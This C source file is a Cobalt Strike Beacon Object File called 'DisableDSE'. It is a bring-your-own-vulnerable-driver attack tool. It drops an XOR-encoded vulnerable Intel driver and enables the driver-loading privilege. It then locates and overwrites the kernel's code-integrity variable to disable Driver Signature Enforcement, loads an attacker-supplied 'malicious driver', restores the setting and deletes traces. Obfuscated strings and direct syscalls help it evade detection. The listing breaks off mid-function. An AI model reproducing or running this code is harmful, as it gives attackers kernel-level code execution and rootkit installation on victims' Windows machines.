////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      DisableDSE BOF
//
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2
//      AUTHOR: @Cerbersec
//      PROPERTY OF: @NVISOSecurity
//
//      COMPILE WITH: gcc -o DisableDSE.o -c DisableDSE.c -masm=intel
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <Windows.h>
#include "DisableDSE.h"
#include "helpers.h"
#include "hde64.h"
#include "Nal.h"
#include "syscalls.c"

void go(char* args, int alen) {
    if (8 != sizeof(void *)) {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    //get build number and verify if compatible
    ULONG buildNumber = GetBuildNumber();
    if (!buildNumber) {
        BeaconPrintf(CALLBACK_ERROR,"Windows version is too old");
        return;
    }

    if (!ChangeTokenPrivileges(TRUE)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not change privileges");
        return;
    }

    datap parser;
    BeaconDataParse(&parser, args, alen);

    //read vulnpayload
    int vPayloadSize = 0;
    SIZE_T vDriverSize = 0;
    char* vDriver = BeaconDataExtract(&parser, &vPayloadSize);
    if(vPayloadSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid vulnerable driver payload"); //TODO: remove
        return;
    }
    else {
        vDriverSize = vPayloadSize;
    }
    vDriver = xordecrypt(vDriver, vDriverSize + 1); //+1 for XOR key

    //read tgtpayload
    int tPayloadSize = 0;
    SIZE_T tDriverSize = 0;
    char* tDriver = BeaconDataExtract(&parser, &tPayloadSize);
    if(tPayloadSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid malicious driver payload"); //TODO: remove
        return;
    }
    else {
        tDriverSize = tPayloadSize;
    }
    tDriver = xordecrypt(tDriver, tDriverSize + 1); //+1 for XOR key

    LPCWSTR lpVulnRegKey = (wchar_t*)BeaconDataExtract(&parser, NULL);
    LPCWSTR lpTgtRegKey = (wchar_t*)BeaconDataExtract(&parser, NULL);
    LPWSTR lpVulnDriverPath = (wchar_t*)BeaconDataExtract(&parser, NULL);
    LPWSTR lpTgtDriverPath = (wchar_t*)BeaconDataExtract(&parser, NULL);
    LPWSTR lpVulnDeviceName = (wchar_t*)BeaconDataExtract(&parser, NULL);
    LPWSTR lpTgtDeviceName = (wchar_t*)BeaconDataExtract(&parser, NULL);

    /*
    //write payload
    LPWSTR lpDriverName = (wchar_t*)BeaconDataExtract(&parser, NULL); //L"NalDrv";
    LPWSTR lpDeviceName = (wchar_t*)BeaconDataExtract(&parser, NULL); //L"Nal";

    //driver file path
    wchar_t* fileName = (wchar_t*)malloc(MAX_PATH * sizeof(wchar_t));//TODO: free
    wchar_t* prefix = wobfsct((wchar_t*)L"\x58\x37\x2f\x7c\x00", 4);//L"\\??\\"; TODO:free
    wchar_t* path = (wchar_t*)BeaconDataExtract(&parser, NULL); //L"C:\\temp\\"
    wcscat_s(fileName, MAX_PATH, prefix);
    wcscat_s(fileName, MAX_PATH, path);
    wcscat_s(fileName, MAX_PATH, lpDriverName);
    wcscat_s(fileName, MAX_PATH, L".sys");
    LPWSTR lpFullFileName = (wchar_t*)fileName;

    //reg key
    //L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
    wchar_t* regKeyConst = (wchar_t*)malloc(MAX_PATH * sizeof(wchar_t));//TODO: free
    wchar_t* key = wobfsct((wchar_t*)L"\x68\x3a\xb5\xc6\x2a\xf5\x79\x68\x4d\x34\x9d\xc0\x20\xee\x64\x74\x51\x34\x83\xd8\x30\xf2\x68\x77\x68\x2b\xffa5\xffd3\x31\xffe3\x63\x6e\x77\x07\xbe\xd5\x31\xe9\x61\x49\x51\x1c\x8c\xf2\x26\xf4\x7b\x73\x57\x0d\xa3\xfd\x00", 52); //TODO: free
    wcscat_s(regKeyConst, MAX_PATH, key);
    wcscat_s(regKeyConst, MAX_PATH, lpDriverName);
    LPCWSTR lpRegKey = (wchar_t*)regKeyConst;
    */

    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //write vulnerable driver
    SIZE_T bytesWritten = WriteBufferToFile(lpVulnDriverPath, vDriver, vDriverSize);
    if (bytesWritten != vDriverSize)
        return;

    HANDLE hDevice = NULL;
    if(!NT_SUCCESS(LoadDriver(&hDevice, lpVulnDeviceName, TRUE, TRUE, lpVulnRegKey, lpVulnDriverPath, FALSE)))
        return;

    //disable DSE
    ULONG DSEValue = 0;
    if (NT_SUCCESS(ControlDSE(hDevice, buildNumber, DSEValue)))
    {
        //load malicious driver
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Ready to load malicious driver");
        //write malicious driver
        bytesWritten = WriteBufferToFile(lpTgtDriverPath, tDriver, tDriverSize);
        if(bytesWritten == tDriverSize) {
            //load malicious driver but don't start it
            if(NT_SUCCESS(LoadDriver(NULL, lpTgtDeviceName, FALSE, FALSE, lpTgtRegKey, lpTgtDriverPath, FALSE))) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver %ws loaded successfully", lpTgtDeviceName);
            }
        }
    }

    //enable DSE
    if(buildNumber < 9600)
        DSEValue = 1;
    else
        DSEValue = 0x6;

    if (NT_SUCCESS(ControlDSE(hDevice, buildNumber, DSEValue)))
        BeaconPrintf(CALLBACK_OUTPUT, "[+] DSE restored");

    if (!NT_SUCCESS(UnloadDriver(&hDevice, lpVulnRegKey, lpVulnDriverPath, TRUE))) {
        DeleteRegKey(lpVulnRegKey);
        return;
    }

    if (!ChangeTokenPrivileges(FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not revert privileges");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
    return;
}

//Driver loading/unloading

BOOLEAN ChangeTokenPrivileges(BOOL Enable) {

    NTSTATUS status;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken;

    status = NtOpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open current process token: %lx", status);
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, wobfsct((wchar_t*)L"\x46\x4f\x18\xc7\x30\xc6\x01\xf8\x7c\x5c\x31\xda\x01\xd0\x2c\xfc\x7c\x46\x31\xcf\x34\x00", 21), &luid)) { //SeLoadDriverPrivilege
        BeaconPrintf(CALLBACK_ERROR, "Privilege lookup error");
        NtClose(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if(Enable)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    status = NtAdjustPrivilegesToken(hToken, FALSE, &tp, 0, NULL, 0);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not adjust token privileges: %lx", status);
        NtClose(hToken);
        return FALSE;
    }

    NtClose(hToken);
    return TRUE;
}

SIZE_T WriteBufferToFile(LPWSTR lpFileName, PVOID Buffer, SIZE_T BufferSize) {
    NTSTATUS status;
    HANDLE hFile = NULL;
    SIZE_T BytesWritten = 0;
    UNICODE_STRING fileName;

    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK sb;

    RtlInitUnicodeString(&fileName, lpFileName);
    RtlZeroMemory(&sb, sizeof(IO_STATUS_BLOCK));
    InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, STANDARD_RIGHTS_WRITE | FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | FILE_WRITE_EA | FILE_APPEND_DATA | SYNCHRONIZE | FILE_READ_DATA | FILE_READ_ATTRIBUTES, &oa, &sb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open file : % lx\n", status);
        return 0;
    }

    IO_STATUS_BLOCK sb1;
    RtlZeroMemory(&sb1, sizeof(IO_STATUS_BLOCK));

    status = NtWriteFile(hFile, NULL, NULL, NULL, &sb1, Buffer, (ULONG)BufferSize, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR,"Could not write file: %lx\n", status);
        return 0;
    }
    else {
        BytesWritten = sb1.Information;
    }

    if (hFile != NULL) {
        NtFlushBuffersFile(hFile, &sb1);
        NtClose(hFile);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done writing");
    return BytesWritten;
}

NTSTATUS CreateDriverEntry(LPCWSTR DriverPath, LPCWSTR KeyName) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hKey;
    ULONG disposition;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING keyName;
    RtlInitUnicodeString(&keyName, KeyName);

    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not create key: %lx", status);
        NtClose(hKey);
        return status;
    }

    UNICODE_STRING keyValueName;
    RtlInitUnicodeString(&keyValueName, L"ErrorControl");
    DWORD keyValue = SERVICE_ERROR_NORMAL;
    status = NtSetValueKey(hKey, &keyValueName, 0, REG_DWORD, (BYTE*)&keyValue, sizeof(keyValue));
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not set value: %lx", status);
        NtClose(hKey);
        return status;
    }

    RtlInitUnicodeString(&keyValueName, L"Type");
    keyValue = SERVICE_KERNEL_DRIVER;
    status = NtSetValueKey(hKey, &keyValueName, 0, REG_DWORD, (BYTE*)&keyValue, sizeof(keyValue));
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not set value: %lx", status);
        NtClose(hKey);
        return status;
    }

    RtlInitUnicodeString(&keyValueName, L"Start");
    keyValue = SERVICE_DEMAND_START;
    status = NtSetValueKey(hKey, &keyValueName, 0, REG_DWORD, (BYTE*)&keyValue, sizeof(keyValue));
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not set value: %lx", status);
        NtClose(hKey);
        return status;
    }

    RtlInitUnicodeString(&keyValueName, L"ImagePath");
    UNICODE_STRING DriverImagePath;
    RtlInitUnicodeString(&DriverImagePath, DriverPath);
    status = NtSetValueKey(hKey, &keyValueName, 0, REG_EXPAND_SZ, (BYTE*)DriverImagePath.Buffer, DriverImagePath.Length + sizeof(UNICODE_NULL));
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not set value: %lx", status);
        NtClose(hKey);
        return status;
    }

    NtClose(hKey);
    return status;
}

NTSTATUS LoadDriver(PHANDLE DeviceHandle, LPCWSTR DeviceName, BOOL Callback, BOOL Start, LPCWSTR RegKey, LPCWSTR DriverPath, BOOLEAN UnloadPreviousInstance) {
    NTSTATUS status;
    UNICODE_STRING driverServiceName;

    status = CreateDriverEntry(DriverPath, RegKey);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create registry key: %lx", status);
        DeleteBinary(DriverPath);
        return status;
    }

    RtlInitUnicodeString(&driverServiceName, RegKey);
    status = NtLoadDriver(&driverServiceName);

    if (UnloadPreviousInstance) {
        if ((status == STATUS_IMAGE_ALREADY_LOADED) ||
            (status == STATUS_OBJECT_NAME_COLLISION) ||
            (status == STATUS_OBJECT_NAME_EXISTS))
        {
            status = NtUnloadDriver(&driverServiceName);
            if (NT_SUCCESS(status)) {
                status = NtLoadDriver(&driverServiceName);
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "Failed to unload previous instance: %lx", status);
            }
        }
    }
    else {
        if (status == STATUS_OBJECT_NAME_EXISTS) {
            status = STATUS_SUCCESS;
        }

        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to load driver: %lx", status);
            Cleanup(RegKey, DriverPath);
        }
    }

    if (NT_SUCCESS(status) && Start) {
        status = StartDriver(DeviceHandle, DeviceName, Callback);
        if (!NT_SUCCESS(status)) {
            status = UnloadDriver(DeviceHandle, RegKey, DriverPath, TRUE);
        }
    }
    return status;
}

NTSTATUS StartDriver(PHANDLE DeviceHandle, LPCWSTR lpDeviceName, BOOL Callback) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hDevice = NULL;

    wchar_t* deviceLink = (wchar_t*)malloc(MAX_PATH * sizeof(wchar_t));
    wchar_t* dosDev = wobfsct((wchar_t*)L"\x50\x5c\x5f\x13\x84\xe4\x75\x6f\x6f\x7d\x43\x3c\x00", 12); //L"\\DosDevices\\" TODO: free
    wcscat_s(deviceLink, MAX_PATH, dosDev);
    wcscat_s(deviceLink, MAX_PATH, lpDeviceName);
    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, deviceLink);

    IO_STATUS_BLOCK sb;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &deviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hDevice, WRITE_DAC | GENERIC_WRITE | GENERIC_READ, &oa, &sb, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Unable to open driver %ws: %lx", deviceLink, status);
        return status;
    }
    else {
        *DeviceHandle = hDevice;

        if (Callback) {
            //run postOpenCallback
            status = NalPostOpenCallback(DeviceHandle);
            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "PostOpenCallback failed: %lx", status);
                return status;
            }
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver started");
    }
    return status;
}

NTSTATUS UnloadDriver(PHANDLE DeviceHandle, LPCWSTR RegKey, LPCWSTR DriverPath, BOOLEAN Remove) {
    NTSTATUS status;
    UNICODE_STRING driverServiceName;

    if (!NT_SUCCESS(NtClose(*DeviceHandle)))
        BeaconPrintf(CALLBACK_ERROR, "Error closing device handle");

    RtlInitUnicodeString(&driverServiceName, RegKey);
    status = NtUnloadDriver(&driverServiceName);

    if (NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Driver unloaded");
        if (Remove)
        {
            if (Cleanup(RegKey, DriverPath))
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Cleanup success");
        }
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to unload driver: %lx", status);
    }
    return status;
}

BOOL Cleanup(LPCWSTR key, LPCWSTR path) {
    NTSTATUS status;
    BOOL reg = TRUE, bin = TRUE;
    if (key) {
        status = DeleteRegKey(key);
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not remove registry key: %ws - %lx", key, status);
            reg = FALSE;
        }
    }

    if (path) {
        status = DeleteBinary(path);
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not remove binary: %ws - %lx", path, status);
            bin = FALSE;
        }
    }
    return (reg && bin);
}

NTSTATUS DeleteRegKey(LPCWSTR key) {
    NTSTATUS status;
    HANDLE hKey;
    UNICODE_STRING keyName;
    RtlInitUnicodeString(&keyName, key);

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKeyEx(&hKey, DELETE, &oa, 0);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Error opening key: %lx", status);
        NtClose(hKey);
        return status;
    }

    status = NtDeleteKey(hKey);
    if (!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not delete key: %lx", status);
        NtClose(hKey);
        return status;
    }

    NtClose(hKey);
    return status;
}

NTSTATUS DeleteBinary(LPCWSTR path) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING binaryPath;
    RtlInitUnicodeString(&binaryPath, path);
    InitializeObjectAttributes(&oa, &binaryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtDeleteFile(&oa);

    for (int i = 0; (i < 3 && !NT_SUCCESS(status)); i++) {
        NtDelayExecution(FALSE, (PLARGE_INTEGER)1000);
        status = NtDeleteFile(&oa);
    }
    return status;
}

//DSE specific

NTSTATUS ControlDSE(HANDLE DeviceHandle, ULONG buildNumber, ULONG DSEValue) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG_PTR variableAddress;
    ULONG flags = 0;

    variableAddress = QueryVariable(buildNumber);
    if (variableAddress == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Could not query system variable address");
    }
    else {
        status = NalReadVirtualMemory(DeviceHandle, variableAddress, &flags, sizeof(flags));
        if (!NT_SUCCESS(status)) {
            BeaconPrintf(CALLBACK_ERROR, "Could not query DSE state: %lx", status);
        }
        else {
            if (DSEValue == flags) {
                BeaconPrintf(CALLBACK_OUTPUT, "[~] Current value is identical to write");
                return STATUS_SUCCESS;
            }

            status = NalWriteVirtualMemory(DeviceHandle, variableAddress, &DSEValue, sizeof(DSEValue));
            if (NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] New DSE Value set, confirming write");
                flags = 0;

                status = NalReadVirtualMemory(DeviceHandle, variableAddress, &flags, sizeof(flags));
                if (NT_SUCCESS(status)) {
                    if (flags == DSEValue)
                        BeaconPrintf(CALLBACK_OUTPUT, "[+] Write success");
                    else
                        BeaconPrintf(CALLBACK_ERROR, "Write failed");
                }
                else {
                    BeaconPrintf(CALLBACK_ERROR, "Could not verify kernel memory write: %lx", status);
                }
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "Error writing to kernel memory: %lx", status);
            }
        }
    }
    return status;
}

ULONG_PTR QueryVariable(ULONG buildNumber) {
    NTSTATUS status;
    ULONG loadedImageSize = 0;
    SIZE_T sizeOfImage = 0;
    ULONG_PTR result = 0, imageLoadedBase, kernelAddress = 0;
    const char* moduleNameA = NULL;
    PCWSTR moduleNameW = NULL;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

    if (buildNumber < 9600) {//WIN8
        moduleNameA = aobfsct((char*)"\x62\x6c\x5f\x13\xab\xf3\x6d\x6a\x22\x7d\x48\x05\x00", 12); //"ntoskrnl.exe";
        moduleNameW = wobfsct((wchar_t*)L"\x62\x6c\x5f\x13\xab\xf3\x6d\x6a\x22\x7d\x48\x05\x00", 12); //L"ntoskrnl.exe";
    }
    else {
        moduleNameA = aobfsct((char*)"\x45\x45\x36\x54\x0c\xac\x00", 6); //"CI.dll";
        moduleNameW = wobfsct((wchar_t*)L"\x45\x45\x36\x54\x0c\xac\x00", 6); //L"CI.dll";
    }

    imageLoadedBase = GetModuleBaseByName(moduleNameA, &loadedImageSize);
    if (imageLoadedBase == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Could not query %s image base", moduleNameA);
        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectoryW(szFullModuleName, MAX_PATH))
        return 0;

    wcscat_s(szFullModuleName, MAX_PATH * 2, L"\\");
    wcscat_s(szFullModuleName, MAX_PATH * 2, moduleNameW);

    mappedImageBase = LoadLibraryExW(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {
        if (buildNumber < 9600) {
            status = QueryImageSize(mappedImageBase, &sizeOfImage);

            if (NT_SUCCESS(status)) {
                status = QueryCiEnabled(mappedImageBase, imageLoadedBase, &kernelAddress, sizeOfImage);
            }
        }
        else {
            status = QueryCiOptions(mappedImageBase, imageLoadedBase, &kernelAddress, buildNumber);
        }

        if (NT_SUCCESS(status)) {
            if (IN_REGION(kernelAddress, imageLoadedBase, loadedImageSize)) {
                result = kernelAddress;
            }
            else {
                BeaconPrintf(CALLBACK_ERROR, "Resolved address 0x%llx does not belong to required module", kernelAddress);
            }
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to locate kernel variable address: %lx", status);
        }
        FreeLibrary(mappedImageBase);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "Could not load %s", moduleNameA);
    }
    return result;
}

NTSTATUS QueryCiEnabled(HMODULE ImageMappedBase, ULONG_PTR ImageLoadedBase, ULONG_PTR* ResolvedAddress, SIZE_T SizeOfImage) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T c;
    LONG rel = 0;

    *ResolvedAddress = 0;

    for (c = 0; c < SizeOfImage - sizeof(DWORD); c++) {
        if (*(PDWORD)((PBYTE)ImageMappedBase + c) == (0xec40375 * 0x2 + 0x1)) {//0x1d8806eb
            rel = *(PLONG)((PBYTE)ImageMappedBase + c + 4);
            *ResolvedAddress = ImageLoadedBase + c + 8 + rel;
            status = STATUS_SUCCESS;
            break;
        }
    }
    return status;
}

NTSTATUS QueryCiOptions(HMODULE ImageMappedBase, ULONG_PTR ImageLoadedBase, ULONG_PTR* ResolvedAddress, ULONG buildNumber) {
    PBYTE ptrCode = NULL;
    ULONG offset, k, expectedLength;
    LONG relativeValue = 0;
    ULONG_PTR resolvedAddress = 0;

    hde64s hs;

    *ResolvedAddress = 0ULL;

    ptrCode = (PBYTE)GetProcAddress(ImageMappedBase, aobfsct((char*)"\x4f\x71\x79\x0e\xa9\xf5\x6a\x67\x60\x71\x4a\x05\x00", 12)); //"CiInitialize" TODO: free
    if (ptrCode == NULL)
        return STATUS_PROCEDURE_NOT_FOUND;

    cZeroMemory(&hs, sizeof(hs));
    offset = 0;

    if (buildNumber < 16299) {
        expectedLength = 5;

        do {
            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) { //test if jmp
                // jmp CipInitialize
                if (ptrCode[offset] == 0xE9) {
                    relativeValue = *(PLONG)(ptrCode + offset + 1);
                    break;
                }
            }
            offset += hs.len;
        } while (offset < 256);
    }
    else {
        expectedLength = 3;

        do {
            hde64_disasm(&ptrCode[offset], &hs);
            if (hs.flags & F_ERROR)
                break;

            if (hs.len == expectedLength) {
                // Parameters for the CipInitialize.
                k = CheckInstructionBlock(ptrCode,
                                          offset);

                if (k != 0) {
                    expectedLength = 5;
                    hde64_disasm(&ptrCode[k], &hs);
                    if (hs.flags & F_ERROR)
                        break;
                    // call CipInitialize
                    if (hs.len == expectedLength) {
                        if (ptrCode[k] == 0xE8) {
                            offset = k;
                            relativeValue = *(PLONG)(ptrCode + k + 1);
                            break;
                        }
                    }
                }
            }
            offset += hs.len;
        } while (offset < 256);
    }

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    relativeValue = 0;
    offset = 0;
    expectedLength = 6;

    do {
        hde64_disasm(&ptrCode[offset], &hs);
        if (hs.flags & F_ERROR)
            break;

        if (hs.len == expectedLength) { //test if mov
            if (*(PUSHORT)(ptrCode + offset) == 0x0d89) {
                relativeValue = *(PLONG)(ptrCode + offset + 2);
                break;
            }
        }
        offset += hs.len;
    } while (offset < 256);

    if (relativeValue == 0)
        return STATUS_UNSUCCESSFUL;

    ptrCode = ptrCode + offset + hs.len + relativeValue;
    resolvedAddress = ImageLoadedBase + ptrCode - (PBYTE)ImageMappedBase;

    *ResolvedAddress = resolvedAddress;
    return STATUS_SUCCESS;
}

//helpers
PVOID GetLoadedModulesList(PULONG ReturnLength) {
    NTSTATUS status;
    PVOID buffer;
    ULONG bufferSize = PAGE_SIZE;
    PRTL_PROCESS_MODULES pvModules;
    SYSTEM_INFORMATION_CLASS infoClass;

    if (ReturnLength)
        *ReturnLength = 0;

    //infoClass = SystemModuleInformation;
    infoClass = (SYSTEM_INFORMATION_CLASS)11;

    buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)bufferSize);
    if (buffer == NULL)
        return NULL;

    status = NtQuerySystemInformation(infoClass, buffer, bufferSize, &bufferSize);
    if (status == STATUS_INFO_LENGTH_MISMATCH) {
        HeapFree(GetProcessHeap(), 0, buffer);
        buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)bufferSize);
        status = NtQuerySystemInformation(infoClass, buffer, bufferSize, &bufferSize);
    }

    if (ReturnLength)
        *ReturnLength = bufferSize;

    if (!NT_SUCCESS(status)) {
        if (status == STATUS_BUFFER_OVERFLOW) {
            pvModules = (PRTL_PROCESS_MODULES)buffer;
            if (pvModules->NumberOfModules != 0)
                return buffer;
        }
        BeaconPrintf(CALLBACK_ERROR, "Could not query system information: %lx", status);
        //return NULL;
    }
    else {
        return buffer;
    }

    if (buffer)
        HeapFree(GetProcessHeap(), 0, buffer);

    return NULL;
}

ULONG_PTR GetModuleBaseByName(const char* ModuleName, PULONG ImageSize) {
    ULONG_PTR returnAddress = 0;
    PRTL_PROCESS_MODULES modules;

    if (ImageSize)
        *ImageSize = 0;

    modules = (PRTL_PROCESS_MODULES)GetLoadedModulesList(NULL);
    if (modules != NULL) {
        for (ULONG i = 0; i < modules->NumberOfModules; i++) {
            if (strcmp((const CHAR*)&modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName, ModuleName) == 0) {
                returnAddress = (ULONG_PTR)modules->Modules[i].ImageBase;
                if (ImageSize)
                    *ImageSize = modules->Modules[i].ImageSize;
                break;
            }
        }
        HeapFree(GetProcessHeap(), 0, modules);
    }
    return returnAddress;
}

NTSTATUS QueryImageSize(PVOID ImageBase, PSIZE_T ImageSize) {
    NTSTATUS status;
    LDR_DATA_TABLE_ENTRY* ldrEntry = NULL;

    *ImageSize = 0;

    status = LdrFindEntryForAddress(ImageBase, &ldrEntry);

    if (NT_SUCCESS(status)) {
        *ImageSize = ldrEntry->SizeOfImage;
    }
    return status;
}

ULONG CheckInstructionBlock(PBYTE Code, ULONG Offset) {
    ULONG offset = Offset;
    hde64s hs;

    cZeroMemory(&hs, sizeof(hs));

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;
    if (hs.len != 3)
        return 0;

    // mov     r9, rbx
    if (Code[offset] != 0x4C || Code[offset + 1] != 0x8B) {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;
    if (hs.len != 3)
        return 0;

    // mov     r8, rdi
    if (Code[offset] != 0x4C || Code[offset + 1] != 0x8B) {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;
    if (hs.len != 3)
        return 0;

    // mov     rdx, rsi
    if (Code[offset] != 0x48 || Code[offset + 1] != 0x8B) {
        return 0;
    }

    offset += hs.len;

    hde64_disasm(&Code[offset], &hs);
    if (hs.flags & F_ERROR)
        return 0;
    if (hs.len != 2)
        return 0;

    // mov     ecx, ebp
    if (Code[offset] != 0x8B || Code[offset + 1] != 0xCD) {
        return 0;
    }
    return offset + hs.len;
}

ULONG GetBuildNumber() {
    OSVERSIONINFOW osv;

    cZeroMemory(&osv, sizeof(osv));
    osv.dwOSVersionInfoSize = sizeof(osv);
    RtlGetVersion(&osv);

    if ((osv.dwMajorVersion < 6) || (osv.dwMajorVersion == 6 && osv.dwMinorVersion == 0) || (osv.dwBuildNumber <= 7600)) {//NalDrv requires build 7601 or newer
        BeaconPrintf(CALLBACK_ERROR, "Unsupported WinNT version");
        return 0;
    }
    return osv.dwBuildNumber;
}

NTSTATUS CreateSystemAdminAccessSD(PSECURITY_DESCRIPTOR* SecurityDescriptor, PACL* DefaultAcl) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG aclSize = 0;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PACL pAcl = NULL;
    PSECURITY_DESCRIPTOR securityDescriptor = NULL;

    UCHAR sidBuffer[2 * sizeof(SID)];

    *SecurityDescriptor = NULL;
    *DefaultAcl = NULL;

    do {
        cZeroMemory(sidBuffer, sizeof(sidBuffer));

        securityDescriptor = (PSECURITY_DESCRIPTOR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECURITY_DESCRIPTOR));
        if (securityDescriptor == NULL) {
            status = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        aclSize += RtlLengthRequiredSid(1);
        aclSize += RtlLengthRequiredSid(2);
        aclSize += sizeof(ACL);
        aclSize += 2 * (sizeof(ACCESS_ALLOWED_ACE) - sizeof(ULONG));

        pAcl = (PACL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, aclSize);
        if (pAcl == NULL) {
            status = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        status = RtlCreateAcl(pAcl, aclSize, ACL_REVISION);
        if (!NT_SUCCESS(status))
            break;

        RtlInitializeSid(sidBuffer, &ntAuthority, 1);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_LOCAL_SYSTEM_RID;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        RtlInitializeSid(sidBuffer, &ntAuthority, 2);
        *(RtlSubAuthoritySid(sidBuffer, 0)) = SECURITY_BUILTIN_DOMAIN_RID;
        *(RtlSubAuthoritySid(sidBuffer, 1)) = DOMAIN_ALIAS_RID_ADMINS;
        RtlAddAccessAllowedAce(pAcl, ACL_REVISION, GENERIC_ALL, (PSID)sidBuffer);

        status = RtlCreateSecurityDescriptor(securityDescriptor, SECURITY_DESCRIPTOR_REVISION1);
        if (!NT_SUCCESS(status))
            break;

